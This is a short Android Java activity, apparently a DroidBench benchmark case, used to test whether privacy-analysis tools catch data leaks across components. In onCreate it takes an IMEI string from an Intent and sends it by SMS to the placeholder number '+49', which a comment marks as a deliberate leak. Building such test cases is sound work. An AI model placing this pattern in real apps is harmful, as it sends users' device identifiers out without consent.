package edu.mit.icc_component_not_in_manifest;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.util.Log;

/*
 * This class is used to make sure that privacy detecting tools can distinguish the different components.
 */
public class IsolateActivity extends Activity 
{

	@Override
	protected void onCreate(Bundle savedInstanceState) 
	{
		super.onCreate(savedInstanceState);
		
		Intent i = getIntent();
		String imei = i.getStringExtra("DroidBench");

		SmsManager sms = SmsManager.getDefault();
		sms.sendTextMessage("+49", null, imei, null, null);  //sink, leak
	}
	
}
